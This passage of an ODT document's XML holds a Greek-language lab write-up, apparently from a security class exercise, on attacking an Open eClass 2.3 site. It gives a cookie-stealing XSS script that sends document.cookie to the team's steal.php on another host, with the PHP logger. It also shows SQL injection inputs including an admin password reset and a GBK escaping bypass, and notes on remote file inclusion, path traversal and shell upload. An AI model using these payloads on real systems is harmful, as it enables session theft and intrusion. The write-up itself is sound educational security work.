      <text:p text:style-name="P24">Τα ίδια δοκιμάσαμε και σε όλες τις φόρμες του <text:span text:style-name="T60">forum reply, topic </text:span>(και στο πεδίο “θέμα”)<text:span text:style-name="T60"> </text:span>χωρίς αποτέλεσμα πάλι.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P13"><text:span text:style-name="T86">Ευάλωτο όμως ήταν και το </text:span><text:span text:style-name="T66">edit </text:span><text:span text:style-name="T86">που μπορεί να κάνει και ο </text:span><text:span text:style-name="T66">admin </text:span><text:span text:style-name="T86">σε κάθε </text:span><text:span text:style-name="T66">post </text:span><text:span text:style-name="T86">ενός </text:span><text:span text:style-name="T66">topic. </text:span><text:span text:style-name="T86">Ένα </text:span><text:span text:style-name="T66">post </text:span><text:span text:style-name="T86">που <text:s/>πραγματοποιεί </text:span><text:span text:style-name="T66">XSS </text:span><text:span text:style-name="T86">ή </text:span><text:span text:style-name="T66">html events </text:span><text:span text:style-name="T86">δεν τρέχει μέχρι να γίνει </text:span><text:span text:style-name="T66">edit. </text:span><text:span text:style-name="T86">Κοιτάζοντας τα </text:span><text:span text:style-name="T66">url </text:span><text:span text:style-name="T86">των </text:span><text:span text:style-name="T66">post </text:span><text:span text:style-name="T86">όταν είναι να γίνουν </text:span><text:span text:style-name="T66">edit </text:span><text:span text:style-name="T86">βρήκαμε τη (διαφορετική) σειρά την οποία ακολουθούν τα</text:span><text:span text:style-name="T66"> id </text:span><text:span text:style-name="T86">των </text:span><text:span text:style-name="T66">topics </text:span><text:span text:style-name="T86">και των </text:span><text:span text:style-name="T66">posts, </text:span><text:span text:style-name="T86">όταν αποθηκευτούν στο </text:span><text:span text:style-name="T66">forum. (</text:span><text:span text:style-name="T86">πχ <text:s/></text:span><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/phpbb/editpost.php?post_id=2&amp;topic=1&amp;forum=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ht</text:a><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/phpbb/editpost.php?post_id=2&amp;topic=1&amp;forum=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T66">tp</text:span></text:a><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/phpbb/editpost.php?post_id=2&amp;topic=1&amp;forum=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">://localhost:8008/openeclass-2.3/modules/phpbb/editpost.php?post_id=2&amp;topic=1&amp;forum=1</text:a><text:span text:style-name="T86"> στο 1ο </text:span><text:span text:style-name="T66">topic </text:span><text:span text:style-name="T86">απο κάτω το 2ο </text:span><text:span text:style-name="T66">post </text:span><text:span text:style-name="T86">απο πάνω). Το κάθε νέο </text:span><text:span text:style-name="T66">post, </text:span><text:span text:style-name="T86">σε οποιοδήποτε </text:span><text:span text:style-name="T66">topic </text:span><text:span text:style-name="T86">κι αν γίνει παίρνει </text:span><text:span text:style-name="T66">id </text:span><text:span text:style-name="T86">τον αριθμό των ήδη υπαρχόντων </text:span><text:span text:style-name="T66">posts + 1. </text:span><text:span text:style-name="T86">Έτσι δοκιμάσαμε να κάνουμε ένα </text:span><text:span text:style-name="T66">post </text:span><text:span text:style-name="T86">στο </text:span><text:span text:style-name="T66">forum </text:span><text:span text:style-name="T86">με τον κώδικα </text:span><text:span text:style-name="T66">XSS </text:span><text:span text:style-name="T86">που θέλουμε να τρέξουμε και να στείλουμε το </text:span><text:span text:style-name="T66">link </text:span><text:span text:style-name="T86">του </text:span><text:span text:style-name="T66">edit </text:span><text:span text:style-name="T86">του στο </text:span><text:span text:style-name="T66">mail </text:span><text:span text:style-name="T86">του διαχειριστή έτσι ώστε να το κάνει </text:span><text:span text:style-name="T66">trigger </text:span><text:span text:style-name="T86">χωρίς τη θέλησή του </text:span><text:span text:style-name="T66">(CSRF).</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P25">Για το νέο <text:span text:style-name="T60">post </text:span>που φτιάξαμε, που είχε αριθμό 16 στείλαμε στο <text:span text:style-name="T60">mail </text:span>του <text:span text:style-name="T60">admin </text:span>μεταμφιεσμένο το:</text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="http://stalkers.nuclear.crypto-class.gr/openeclass-2.3/modules/phpbb/editpost.php?post_id=16&amp;topic=1&amp;forum=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T29">http://stalkers.nuclear.crypto-class.gr/openeclass-2.3/modules/phpbb/editpost.php?post_id=16&amp;topic=1&amp;forum=1</text:span></text:a></text:p>
      <text:p text:style-name="P12"><text:soft-page-break/></text:p>
      <text:p text:style-name="P25">το οποίο θα τρεχε:</text:p>
      <text:p text:style-name="P12">&lt;script&gt;document.write('&lt;img src="http://nialfa.nuclear.crypto-class.gr/courses/steal.php?cookie=' + document.cookie + '" /&gt;')&lt;/script&gt;</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P22">με το <text:span text:style-name="T60">steal.php </text:span><text:span text:style-name="T98">που βρίσκεται στο </text:span><text:span text:style-name="T66">site </text:span><text:span text:style-name="T98">μας </text:span>να περιέχει</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P33">&lt;?php</text:p>
      <text:p text:style-name="P73"><text:tab/>file_put_contents("yourcookies.txt", $_GET['cookie']);</text:p>
      <text:p text:style-name="P33">?&gt;</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P30">Login</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P26">Δοκιμάσαμε <text:span text:style-name="T60">sql injection </text:span>στο <text:span text:style-name="T60">username </text:span>με απλά <text:span text:style-name="T60">quotes </text:span>το οποίο δε δούλεψε, λογικό αφού χρησιμοποιείται η <text:span text:style-name="T60">escapeSimple </text:span>συνάρτηση πάνω στο <text:span text:style-name="T60">username, </text:span>που κάνει <text:span text:style-name="T60">skip </text:span>τους ‘ χαρακτήρες. <text:span text:style-name="T115">Δοκιμάστηκε και χωρίς καθόλου ‘ για να δούμε αν χρησιμοποιείται “σωστά” η </text:span><text:span text:style-name="T78">mysql_real_escape_string (</text:span><text:span text:style-name="T115">σε περίπτωση που χρησιμοποιείται βέβαια) καθώς πάντα υπάρχει περίπτωση να εχει παραλείψει να βάλει το όρισμα σε ‘ ‘, πχ </text:span><text:span text:style-name="T79">WHERE </text:span><text:span text:style-name="T78">id=$id;. </text:span><text:span text:style-name="T116">Ούτε αυτό άλλαξε κάτι.</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P67"><text:span text:style-name="T28">Π</text:span><text:span text:style-name="T27">αράδειγμα εισόδου:</text:span></text:p>
      <text:p text:style-name="P63"><text:span text:style-name="T28">1’; </text:span><text:span text:style-name="T27">UPDATE user SET password=’0000’ WHERE username=’drunkadmin’;</text:span></text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T27">(</text:span><text:span text:style-name="T1">για τη 2η περίπτωση 1 </text:span><text:span text:style-name="T17">OR 1=1)</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P61"><text:span text:style-name="T9">Στη συνέχεια δοκιμάσαμε, ενεργοποιώντας το </text:span><text:span text:style-name="T23">GBK charset </text:span><text:span text:style-name="T9">στο </text:span><text:span text:style-name="T23">browser</text:span><text:span text:style-name="T28"> </text:span><text:span text:style-name="T5">να μπερδέψουμε αυτή τη συνάρτηση με τον ίδιο τρόπο που θ’ αντιμετώπιζε κάποιος την </text:span><text:span text:style-name="T20">addslashes, <text:s/></text:span><text:span text:style-name="T5">χρησιμοποιώντας τους χαρακτήρες με </text:span><text:span text:style-name="T20">ASCII codes </text:span><text:span text:style-name="T5">0</text:span><text:span text:style-name="T20">xbf</text:span><text:span text:style-name="T5">(</text:span><text:span text:style-name="T54">¿</text:span><text:span text:style-name="T32">)</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T5">και </text:span><text:span text:style-name="T20">0x27</text:span><text:span text:style-name="T5">(‘)</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T5">στη σειρά, <text:s/></text:span><text:span text:style-name="T6">σχηματίζοντας έτσι τον </text:span><text:span text:style-name="T21">invalid </text:span><text:span text:style-name="T6">χαρακτήρα </text:span><text:span text:style-name="T21">0xbf27. <text:s/></text:span><text:span text:style-name="T6">Έ</text:span><text:span text:style-name="T5">τσι </text:span><text:span text:style-name="T6">το </text:span><text:span text:style-name="T20">slash </text:span><text:span text:style-name="T5">που θα προστεθεί </text:span><text:span text:style-name="T6">απ’ τη συνάρτηση ανάμεσα στα άλλα δύο σύμβολα</text:span><text:span text:style-name="T5">(με κωδικό </text:span><text:span text:style-name="T20">0x5c) </text:span><text:span text:style-name="T5">θα δημιουργήσει το νέο, </text:span><text:span text:style-name="T21">valid </text:span><text:span text:style-name="T6">πλέον, </text:span><text:span text:style-name="T5">χαρακτήρα </text:span><text:span text:style-name="T20">0xbf5c27, </text:span><text:span text:style-name="T6">στην προσπάθειά του να κάνει </text:span><text:span text:style-name="T21">skip </text:span><text:span text:style-name="T6">το ‘, </text:span><text:span text:style-name="T7">και αυτόν θα ακολουθεί <text:s/>ένα επιπλέον ‘ που δε θα γίνει </text:span><text:span text:style-name="T22">skip, </text:span><text:span text:style-name="T8">χωρίς αποτέλεσμα. </text:span><text:span text:style-name="T10">Δεν είμαστε σίγουροι ότι ο </text:span><text:span text:style-name="T24">server </text:span><text:span text:style-name="T10">υποστηρίζει </text:span><text:span text:style-name="T24">GBK encoding, </text:span><text:span text:style-name="T11">αλλά δοκιμάστηκε για παν ενδεχόμενο.</text:span></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P68"><text:span text:style-name="T20">Π</text:span><text:span text:style-name="T22">αράδειγμα εισόδου:</text:span></text:p>
      <text:p text:style-name="P62"><text:span text:style-name="T22">1</text:span><text:span text:style-name="T55">¿’’</text:span><text:span text:style-name="T32"> ; </text:span><text:span text:style-name="T33">UPDATE user SET password=</text:span><text:span text:style-name="T55">¿</text:span><text:span text:style-name="T32">’</text:span><text:span text:style-name="T33">’0000</text:span><text:span text:style-name="T55">¿</text:span><text:span text:style-name="T32">’</text:span><text:span text:style-name="T33">’;</text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P3"><text:span text:style-name="T43">Την ίδια μέθοδο προσπαθήσαμε να χρησιμοποιήσουμε και στη φόρμα του </text:span><text:span text:style-name="T49">dropbox, </text:span><text:span text:style-name="T43">που όντως χρησιμοποιεί </text:span><text:span text:style-name="T49">addslashes </text:span><text:span text:style-name="T44">για να καθαρίσει το όνομα του αρχείου που πρόκειται ν’ ανέβει και πραγματοποιεί </text:span><text:span text:style-name="T50">query </text:span><text:span text:style-name="T44">χωρίς άλλη προστασία αλλά πριν γίνουν τα </text:span><text:span text:style-name="T51">queries </text:span><text:span text:style-name="T45">το όνομα του αρχείου κωδικοποιείται </text:span><text:span text:style-name="T52">(</text:span><text:span text:style-name="T46">πχ </text:span><text:span text:style-name="T52">σε 5777cccb6a2e</text:span>.<text:span text:style-name="T68">php) </text:span><text:span text:style-name="T46">άρα δεν μπορεί να γίνει </text:span><text:span text:style-name="T51">inject </text:span><text:span text:style-name="T45">κώδικας. </text:span><text:span text:style-name="T47">(Παρακάτω όπου αναφέρεται ότι δοκιμάστηκε για </text:span><text:span text:style-name="T53">SQL injection </text:span><text:span text:style-name="T47">εννοείται ό,τι δοκιμάστηκε και εδώ + ό,τι άλλο αναφέρεται.</text:span><text:span text:style-name="T48">)</text:span></text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P72"><text:span text:style-name="T35">Ε</text:span><text:span text:style-name="T34">γγραφή Χρήστη</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P69"><text:span text:style-name="T36">Το όνομα και το επώνυμο στην εγγραφή χρήστη ήταν ευάλωτο σε </text:span><text:span text:style-name="T40">XSS, </text:span><text:span text:style-name="T36">δοκιμάσσαμε να γραφτούμε με στοιχεία:</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42">&lt;script&gt;document.write('&lt;img src="http://nialfa.nuclear.crypto-class.gr/courses/steal.php?cookie=' + document.cookie + '" /&gt;')&lt;/script&gt;</text:p>
      <text:p text:style-name="P42"><text:soft-page-break/></text:p>
      <text:p text:style-name="P42">όμως δε δούλεψε.</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P23"><text:span text:style-name="T56">Τα </text:span><text:span text:style-name="T58">scripts </text:span><text:span text:style-name="T56">αντί ονόματος εκτελούνταν </text:span><text:span text:style-name="T57">σε κάθε </text:span><text:span text:style-name="T59">link </text:span><text:span text:style-name="T57">που πατούσε ο χρήστης με αυτά τα στοιχεία, και επιπλέον ακόμα </text:span><text:span text:style-name="T56">και όταν ο </text:span><text:span text:style-name="T58">admin </text:span><text:span text:style-name="T56">πήγαινε στη Διαχείριση Πλατφόρμας, και σκεφτήκαμε να κάνουμε </text:span><text:span text:style-name="T58">CSRF </text:span><text:span text:style-name="T56">στέλνοντας τους μέσω </text:span><text:span text:style-name="T58">mail </text:span><text:span text:style-name="T56">ένα </text:span><text:span text:style-name="T58">link </text:span><text:span text:style-name="T56">στη συγκεκριμένη σελίδα, όμως με τα ονόματα/</text:span><text:span text:style-name="T58">passwords sanitized </text:span><text:span text:style-name="T56"><text:s/>δε θα είχε αποτέλεσμα.</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P43">Και στην “Αλλαγή του Προφίλ μου” τα στοιχεία φιλτράρονταν και δεν ήταν δυνατόν να τα αλλάξουμε εκ’ των υστέρων.</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P51">Ανάκτηση Μαθήματος</text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P70"><text:span text:style-name="T36">Ψάχνοντας για </text:span><text:span text:style-name="T40">include( </text:span><text:span text:style-name="T36">συντάξεις τ’ αρχεία του </text:span><text:span text:style-name="T40">openeclass </text:span><text:span text:style-name="T37">για τυχόν σημεία κώδικα ευάλωτα σε </text:span><text:span text:style-name="T41">RFI </text:span><text:span text:style-name="T37">βρήκαμε το:</text:span></text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P71"><text:span text:style-name="T36">C:\xampp\htdocs\openeclass-2.3\modules\course_info\</text:span><text:span text:style-name="T40">r</text:span><text:span text:style-name="T36">estore_course.php (5 hits)</text:span></text:p>
      <text:p text:style-name="P46"><text:s/>Line 109: <text:s/>include($_POST['restoreThis'] . '/backup.php');</text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P71"><text:span text:style-name="T36">Αν η λειτουργία </text:span><text:span text:style-name="T40">restore </text:span><text:span text:style-name="T36">μπορούσε να γίνει από απλό χρήστη, θα ήταν δυνατόν να βάλουμε δικό μας κώδικα, </text:span><text:span text:style-name="T38">φτιάχνοντας ένα </text:span><text:span text:style-name="T42">zip </text:span><text:span text:style-name="T38">με κατα τ’άλλα σωστά </text:span><text:span text:style-name="T39">αρχεία</text:span><text:span text:style-name="T38"> εκτός απ’ το </text:span><text:span text:style-name="T42">backup.php, </text:span><text:span text:style-name="T38">το οποίο θα μπορούσε να περιέχει δικό μας κώδικα, πχ ένα </text:span><text:span text:style-name="T42">shell c99.</text:span><text:span text:style-name="T36"> <text:s/></text:span><text:span text:style-name="T38">Χρειάζεται όμως </text:span><text:span text:style-name="T40">administration access, </text:span><text:span text:style-name="T36">άρα απαιτείται ή </text:span><text:span text:style-name="T40">CSRF </text:span><text:span text:style-name="T36">που είναι αδύνατον στην προκειμένη να’χει κάποιο αποτέλεσμα, εξαιτίας της φόρμας που πρέπει να συμπληρωθεί ύστερα, ή να μπούμε ως </text:span><text:span text:style-name="T40">admins, <text:s/></text:span><text:span text:style-name="T36">στην οποία περίπτωση έχουμε πολυ αμεσότερους τρόπους για </text:span><text:span text:style-name="T40">defacement.</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P55">Dropbox – Assignments</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P15"><text:span text:style-name="T87">Βρήκαμε ότι όταν αλλάξουμε το </text:span><text:span text:style-name="T67">choice </text:span><text:span text:style-name="T87">στο </text:span><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1&amp;choice=edit" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T31">http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1&amp;choice=edit</text:span></text:a><text:span text:style-name="T87"> που προσπαθεί να κάνει </text:span><text:span text:style-name="T67">edit </text:span><text:span text:style-name="T87">την εργασία με κάτι άσχετο, πχ <text:s/></text:span><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1&amp;choice=www.google.gr" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T31">http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1&amp;choice=www.google.gr</text:span></text:a><text:span text:style-name="T87"> ενώ είμαστε </text:span><text:span text:style-name="T67">admin </text:span><text:span text:style-name="T87">το </text:span><text:span text:style-name="T67">site </text:span><text:span text:style-name="T87">κάνει </text:span><text:span text:style-name="T67">display </text:span><text:span text:style-name="T87">το κωδικοποιημένο όνομα του φακέλου στο οποίο βρίσκεται το αρχείο-εργασία που έχουμε ανεβάσει</text:span><text:span text:style-name="T67">. </text:span><text:span text:style-name="T87">Το πρόβλημα ήταν ότι αν αναγκάζαμε τον </text:span><text:span text:style-name="T67">admin </text:span><text:span text:style-name="T87">να ακολουθήσει ένα τέτοιο </text:span><text:span text:style-name="T67">link, </text:span><text:span text:style-name="T87">μόνο αυτός θα έβλεπε το φάκελο, εμείς δε θα ‘χαμε τρόπο να το μάθουμε.</text:span></text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P15"><text:span text:style-name="T87">Βρήκαμε όμως </text:span><text:span text:style-name="T89">επίσης </text:span><text:span text:style-name="T87">ότι μπαίνοντα</text:span><text:span text:style-name="T89">ς</text:span><text:span text:style-name="T87"> σε μια εργασία που υπάρχει εμφανίζεται ένα </text:span><text:span text:style-name="T67">url </text:span><text:span text:style-name="T87">του τύπου </text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T29">http://localhost:8008/openeclass-2.3/modules/work/work.php?id</text:span></text:a><text:a xlink:type="simple" xlink:href="http://localhost:8008/openeclass-2.3/modules/work/work.php?id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T30">=1</text:span></text:a></text:p>
      <text:p text:style-name="P54"><text:span text:style-name="T80">Αλλάζοντας το </text:span>id <text:span text:style-name="T80">σε κάτι που δεν υπάρχει, δηλαδή ένα </text:span>id <text:span text:style-name="T80">εργασίας που δεν έχει δημιουργηθεί, και μετά υποβάλλοντας το αρχείο-</text:span>script <text:span text:style-name="T80">που θέλουμε το αρχείο αυτό γίνεται </text:span>upload <text:span text:style-name="T80">στο φάκελο με το προηγουμένως ανύπαρκο </text:span>id <text:span text:style-name="T80">που επιλέξαμε, άρα μπορούσαμε να γνωρίζουμε την ακριβή θέση του αρχείου στο </text:span>site, <text:span text:style-name="T80">έτσι ώστε εκ’ των υστέρων να το τρέξουμε, </text:span><text:span text:style-name="T88">ειδικά απ’ τη στιγμή που όπως φαίνεται επιτρέπονται αρχεία .</text:span><text:span text:style-name="T99">php </text:span><text:span text:style-name="T88">χωρίς αλλαγή στο όνομα τους, σε αντίθεση <text:s/>με το </text:span><text:span text:style-name="T99">dropbox </text:span><text:span text:style-name="T88">που προνοεί</text:span><text:span text:style-name="T99">.</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P50"><text:span text:style-name="T101">Το πρόβλημα ήταν ότι όταν προσπαθούσαμε να τρέξουμε κάποιο αρχείο δίνοντας τη διεύθυνσή του στο </text:span><text:span text:style-name="T104">site, </text:span><text:span text:style-name="T101">πχ ένα απλό .</text:span><text:span text:style-name="T104">php script </text:span><text:span text:style-name="T101">ή ένα </text:span><text:span text:style-name="T104">shell </text:span><text:span text:style-name="T101">αυτό φαινόταν να μην </text:span><text:span text:style-name="T104">υπάρχει</text:span><text:span text:style-name="T105">(File not found) </text:span><text:span text:style-name="T104">τόσο</text:span><text:span text:style-name="T101"> στο δικό μας που γνωρίζαμε σίγουρα το μέρος αποθήκευσης όσο και στων αντιπάλων. </text:span><text:span text:style-name="T102">Έπρεπε να βρούμε τρόπο να αποθηκεύσουμε το αρχείο που θέλουμε έξω απ’ το </text:span><text:span text:style-name="T106">STALKERS_COURSE, </text:span><text:span text:style-name="T102">έτσι ώστε να </text:span><text:soft-page-break/><text:span text:style-name="T102">μπορεί να τρέξει. </text:span><text:span text:style-name="T103">Η επόμενη</text:span><text:span text:style-name="T107"> σκέψη ήταν στο </text:span><text:span text:style-name="T70">id </text:span><text:span text:style-name="T107">να δόσουμε το μονοπάτι που οδηγούσε σε προηγούμενο φάκελο, πχ αν δίναμε id=../../../ το νέο αρχείο θα αποθηκευόταν στον ίδιο φάκελο με το </text:span><text:span text:style-name="T71">index.php, </text:span><text:span text:style-name="T108">το </text:span><text:span text:style-name="T71">face </text:span><text:span text:style-name="T108">του </text:span><text:span text:style-name="T71">site. </text:span><text:span text:style-name="T109">Δυστυχώς όμως η φόρμα είχε γίνει </text:span><text:span text:style-name="T72">modify </text:span><text:span text:style-name="T109">για να δέχεται μόνο </text:span><text:span text:style-name="T72">integers </text:span><text:span text:style-name="T109">ως </text:span><text:span text:style-name="T72">id.</text:span></text:p>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P49">Δοκιμάσαμε <text:span text:style-name="T111">και για </text:span><text:span text:style-name="T69">SQL injection </text:span><text:span text:style-name="T100">στη φόρμα </text:span><text:span text:style-name="T69">submit </text:span><text:span text:style-name="T100">της εργασίας η οποία είναι ευάλωτη και στον τρόπο που εκτελεί </text:span><text:span text:style-name="T76">queries </text:span><text:span text:style-name="T112">για να διαπιστώσει την ύπαρξη ή μη προηγούμενης εργασίας. Αλλάξαμε στο </text:span><text:span text:style-name="T69">url </text:span><text:span text:style-name="T100">το </text:span><text:span text:style-name="T69">id </text:span><text:span text:style-name="T100">σε: </text:span><text:span text:style-name="T75">i</text:span><text:span text:style-name="T100">d=1' OR id='2 για να δούμε αν γίνεται </text:span><text:span text:style-name="T73">sanitize </text:span><text:span text:style-name="T100">το </text:span><text:span text:style-name="T69">input. </text:span><text:span text:style-name="T100">Όντως γινόταν - το δέχτηκε όλο ως </text:span><text:span text:style-name="T69">id </text:span><text:span text:style-name="T113">κάνοντας </text:span><text:span text:style-name="T77">skip </text:span><text:span text:style-name="T113">τα /</text:span><text:span text:style-name="T69">, </text:span><text:span text:style-name="T100">λέγοντας και πάλι πως χρειάζεται </text:span><text:span text:style-name="T69">integer, </text:span><text:span text:style-name="T110">άρα δεν ήταν δυνατό ούτε το </text:span><text:span text:style-name="T74">SQLi</text:span><text:span text:style-name="T69">.</text:span></text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P57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tab-stop-distance="0.5in" style:writing-mode="lr-tb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2T21:47:45.806000000</dc:date>
    <meta:editing-duration>PT10H39M25S</meta:editing-duration>
    <meta:editing-cycles>96</meta:editing-cycles>
    <meta:generator>LibreOffice/5.1.3.2$Windows_x86 LibreOffice_project/644e4637d1d8544fd9f56425bd6cec110e49301b</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="66" meta:word-count="1552" meta:character-count="10754" meta:non-whitespace-character-count="9245"/>
  </office:meta>
</office:document-meta>
</file>